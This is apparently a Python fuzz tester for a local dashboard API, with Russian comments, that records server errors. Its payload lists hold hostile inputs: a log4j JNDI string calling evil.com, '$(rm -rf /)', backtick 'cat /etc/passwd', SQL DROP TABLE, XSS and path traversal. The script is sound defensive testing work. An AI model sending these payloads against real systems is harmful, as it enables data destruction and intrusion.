"""Fuzz-тестер API дашборда.

Цель: найти 500-е ошибки, crashы и silent failures при подаче случайных/
злонамеренных inputs. НЕ проверяет бизнес-логику — только что сервер
возвращает валидный HTTP-ответ без unhandled exception.

Ожидаемые статусы: 200/201/204 (ok), 400 (bad request), 403 (forbidden),
404 (not found), 409 (conflict). 500 — это FAIL (unhandled).
"""

from __future__ import annotations

import json
import random
import string
import sys
import time
import traceback
from pathlib import Path

import requests

BASE = "http://localhost:5757"
SESSION = requests.Session()
SESSION.headers["Content-Type"] = "application/json"

# Злонамеренные/пограничные payload'ы. Сокращены без 1MB чтобы fuzz не длился часами.
EVIL_STRINGS = [
    "",                      # пустая строка
    " ",                     # пробел
    "\x00",                  # null byte
    "\n\r\t",                # управляющие символы
    "A" * 10_000,            # большая строка (вместо 100k/1M)
    "../../../../etc/passwd",                    # classic path traversal
    "..\\..\\..\\..\\Windows\\System32",         # Windows-стиль
    "%2e%2e%2f%2e%2e%2f",                        # URL-encoded ..
    "....//....//",                              # double-dot bypass
    "${jndi:ldap://evil.com/a}",                 # log4j injection
    "; DROP TABLE projects;--",                  # SQL
    "<script>alert(1)</script>",                 # XSS
    "$(rm -rf /)",                               # shell
    "`cat /etc/passwd`",                         # shell backtick
    "\uFEFF" + "bom",                            # BOM
    "ы" * 500 + "𝕳" * 50,                        # unicode + surrogates
    "\\uD83D\\uDE00",                            # raw surrogate в JSON
    "🔥" * 100,                                  # emoji
    None,                                        # JSON null → python None
]

EVIL_INTS = [
    -1, 0, 1,
    -(2**31), 2**31 - 1,
    -(2**63), 2**63 - 1,
    2**100,                  # огромное
    -999999999,
    "abc",                   # не число
    "1; DROP",
    3.14,                    # float вместо int
    True,                    # bool
    [],                      # список
    {},                      # dict
]

RESULTS = []  # {"endpoint": ..., "payload": ..., "status": int, "fail": bool, "detail": str}


def _log(endpoint: str, method: str, payload, status: int | None, detail: str, fail: bool):
    RESULTS.append({
        "endpoint": endpoint,
        "method": method,
        "payload_preview": str(payload)[:200] if payload is not None else None,
        "status": status,
        "detail": detail,
        "fail": fail,
    })
    mark = "💥 FAIL" if fail else "✓"
    print(f"{mark} [{status}] {method} {endpoint} — {detail[:100]}")


def _req(method: str, path: str, *, json_body=None, params=None, timeout=10):
    try:
        if method == "GET":
            r = SESSION.get(BASE + path, params=params, timeout=timeout)
        elif method == "POST":
            r = SESSION.post(BASE + path, data=json.dumps(json_body) if json_body is not None else None, timeout=timeout)
        elif method == "PATCH":
            r = SESSION.patch(BASE + path, data=json.dumps(json_body) if json_body is not None else None, timeout=timeout)
        elif method == "DELETE":
            r = SESSION.delete(BASE + path, data=json.dumps(json_body) if json_body is not None else None, timeout=timeout)
        elif method == "PUT":
            r = SESSION.put(BASE + path, data=json.dumps(json_body) if json_body is not None else None, timeout=timeout)
        else:
            return None, "unknown method", True
        # 500 = unhandled exception — это fail.
        # 200-499 (кроме 5xx) — валидные ответы.
        fail = r.status_code >= 500
        return r.status_code, r.text[:200], fail
    except requests.Timeout:
        return None, "TIMEOUT (>10s)", True
    except requests.ConnectionError as e:
        return None, f"CONN_ERR: {e}", True
    except Exception as e:
        return None, f"CLIENT_EXC: {e}", True


# ==== Отдельные fuzzers ====

def fuzz_ingest():
    for proj in EVIL_STRINGS[:10]:
        for src in EVIL_STRINGS[:5]:
            for to in EVIL_INTS[:6]:
                payload = {"project": proj, "source": src, "timeout": to}
                s, d, f = _req("POST", "/api/ingest", json_body=payload)
                _log("/api/ingest", "POST", payload, s, d, f)


def fuzz_lint():
    for proj in EVIL_STRINGS[:10]:
        for sem in [True, False, "abc", None, 1, []]:
            for save in [True, False, "abc"]:
                payload = {"project": proj, "semantic": sem, "save": save}
                s, d, f = _req("POST", "/api/lint", json_body=payload)
                _log("/api/lint", "POST", payload, s, d, f)


def fuzz_assign():
    for chat in EVIL_STRINGS[:15]:
        for proj in EVIL_STRINGS[:5]:
            payload = {"chat_path": chat, "project": proj}
            s, d, f = _req("POST", "/api/assign", json_body=payload)
            _log("/api/assign", "POST", payload, s, d, f)


def fuzz_delete_chat():
    for chat in EVIL_STRINGS[:20]:
        payload = {"chat_path": chat}
        s, d, f = _req("DELETE", "/api/chat", json_body=payload)
        _log("/api/chat", "DELETE", payload, s, d, f)


def fuzz_projects_create():
    for name in EVIL_STRINGS[:10]:
        for vr in EVIL_STRINGS[:5]:
            for cwd in [[], EVIL_STRINGS[:3], "not-a-list", None]:
                payload = {"name": name, "vault_root": vr, "cwd_patterns": cwd}
                s, d, f = _req("POST", "/api/projects", json_body=payload)
                _log("/api/projects", "POST", payload, s, d, f)


def fuzz_settings_patch():
    for proj in ["LLM Wiki Control Panel", "nonexistent-123"]:
        for vr in EVIL_STRINGS[:10]:
            payload = {"vault_root": vr}
            s, d, f = _req("PATCH", f"/api/settings/{proj}", json_body=payload)
            _log(f"/api/settings/<{proj[:20]}>", "PATCH", payload, s, d, f)
        for cl in EVIL_INTS[:8]:
            payload = {"context_limit": cl}
            s, d, f = _req("PATCH", f"/api/settings/{proj}", json_body=payload)
            _log(f"/api/settings/<{proj[:20]}>", "PATCH", payload, s, d, f)
        for sched in EVIL_STRINGS[:8]:
            payload = {"lint_schedule": sched}
            s, d, f = _req("PATCH", f"/api/settings/{proj}", json_body=payload)
            _log(f"/api/settings/<{proj[:20]}>", "PATCH", payload, s, d, f)


def fuzz_chat_preview():
    for chat in EVIL_STRINGS[:15]:
        s, d, f = _req("GET", "/api/chat/preview", params={"path": chat})
        _log("/api/chat/preview", "GET", chat, s, d, f)


def fuzz_jobs_limit():
    for lim in EVIL_INTS + ["-1", "abc", "999999", ""]:
        s, d, f = _req("GET", "/api/jobs", params={"limit": lim})
        _log("/api/jobs", "GET", {"limit": lim}, s, d, f)


def fuzz_hook_log_lines():
    for lines in EVIL_INTS + ["abc", "-5", "9999999"]:
        s, d, f = _req("GET", "/api/hook-log", params={"lines": lines})
        _log("/api/hook-log", "GET", {"lines": lines}, s, d, f)


def fuzz_prompts_put():
    for name in ["ingest-ru", "nonexistent", "../../etc/passwd", "name;rm"]:
        for content in [EVIL_STRINGS[i] for i in (1, 4, 6, 17)]:  # пробел, 1MB, path traversal, emoji
            payload = {"content": content}
            s, d, f = _req("PUT", f"/api/prompts/{name}", json_body=payload)
            _log(f"/api/prompts/{name[:30]}", "PUT", {"content_len": len(str(content))}, s, d, f)


def fuzz_log_stats():
    for proj in EVIL_STRINGS[:10] + ["LLM Wiki Control Panel"]:
        for listp in [None, "1", "0", "abc"]:
            params = {"list": listp} if listp else None
            s, d, f = _req("GET", f"/api/project/{proj}/log-stats", params=params)
            _log(f"/api/project/<p>/log-stats", "GET", {"proj_len": len(str(proj)), "list": listp}, s, d, f)


def fuzz_archive_log():
    for proj in ["LLM Wiki Control Panel", "nonexistent"]:
        for keep in EVIL_INTS + ["abc", "-5", "0"]:
            payload = {"keep_last": keep}
            s, d, f = _req("POST", f"/api/project/{proj}/archive-log", json_body=payload)
            _log(f"/api/project/<p>/archive-log", "POST", payload, s, d, f)


def fuzz_claude_projects():
    for enc in EVIL_STRINGS[:15]:
        s, d, f = _req("GET", f"/api/claude-projects-folder/{enc}/sessions")
        _log(f"/api/claude-projects-folder/<enc>/sessions", "GET", enc, s, d, f)


def fuzz_import_sessions():
    for proj in ["LLM Wiki Control Panel", "nonexistent"]:
        for paths in [None, [], "not-a-list", EVIL_STRINGS[:5], [EVIL_STRINGS[6]]*100]:
            payload = {"project": proj, "session_paths": paths}
            s, d, f = _req("POST", "/api/import-sessions", json_body=payload)
            _log(f"/api/import-sessions", "POST", {"proj": proj, "paths_len": len(paths) if isinstance(paths, list) else 'N/A'}, s, d, f)


def fuzz_force_dump():
    for sid in EVIL_STRINGS[:10]:
        for tgt in ["LLM Wiki Control Panel", "nonexistent", None]:
            payload = {"sid": sid, "target_project": tgt}
            s, d, f = _req("POST", "/api/active-sessions/force-dump", json_body=payload)
            _log("/api/active-sessions/force-dump", "POST", payload, s, d, f)


def fuzz_backups():
    for proj in ["LLM Wiki Control Panel", "nonexistent"]:
        for bid in EVIL_STRINGS[:10] + ["../../etc", "%00", "..\\.."]:
            s, d, f = _req("POST", f"/api/project/{proj}/backups/{bid}/restore")
            _log(f"/api/project/<p>/backups/<bid>/restore", "POST", {"bid": bid[:40]}, s, d, f)
            s, d, f = _req("DELETE", f"/api/project/{proj}/backups/{bid}")
            _log(f"/api/project/<p>/backups/<bid>", "DELETE", {"bid": bid[:40]}, s, d, f)


def fuzz_optimization():
    for proj in ["LLM Wiki Control Panel", "nonexistent"]:
        for fn in ["index.md", "log.md", "../../etc/passwd", "", "whatever.txt"]:
            for tc in EVIL_INTS[:6]:
                payload = {"file_name": fn, "target_chars": tc}
                s, d, f = _req("POST", f"/api/project/{proj}/suggest-optimization", json_body=payload)
                _log(f"/api/project/<p>/suggest-optimization", "POST", {"fn": fn, "tc": tc}, s, d, f, )


def fuzz_all():
    print("=" * 60)
    print("FUZZ audit — запуск")
    print("=" * 60)
    start = time.time()
    fuzz_ingest()
    fuzz_lint()
    fuzz_assign()
    fuzz_delete_chat()
    fuzz_projects_create()
    fuzz_settings_patch()
    fuzz_chat_preview()
    fuzz_jobs_limit()
    fuzz_hook_log_lines()
    fuzz_prompts_put()
    fuzz_log_stats()
    fuzz_archive_log()
    fuzz_claude_projects()
    fuzz_import_sessions()
    fuzz_force_dump()
    fuzz_backups()
    fuzz_optimization()

    duration = time.time() - start
    fails = [r for r in RESULTS if r["fail"]]
    print()
    print("=" * 60)
    print(f"Fuzz finished: {len(RESULTS)} requests in {duration:.1f}s")
    print(f"FAILS (status 5xx / timeout / crash): {len(fails)}")
    print("=" * 60)

    if fails:
        print("\n🔴 FAILURES:")
        # группируем по endpoint
        by_ep: dict[str, list] = {}
        for r in fails:
            by_ep.setdefault(r["endpoint"], []).append(r)
        for ep, rows in by_ep.items():
            print(f"\n  {ep} ({len(rows)} failures):")
            for r in rows[:3]:  # первые 3 примера
                print(f"    - [{r['status']}] {r['method']} payload={r['payload_preview'][:80]!r}")
                print(f"      → {r['detail'][:150]}")

    # Сохраним полный лог в файл для анализа
    out = Path(__file__).parent / "fuzz-results.json"
    out.write_text(json.dumps(RESULTS, indent=2, ensure_ascii=False, default=str), encoding="utf-8")
    print(f"\nFull results: {out}")
    return len(fails)


if __name__ == "__main__":
    sys.exit(fuzz_all())
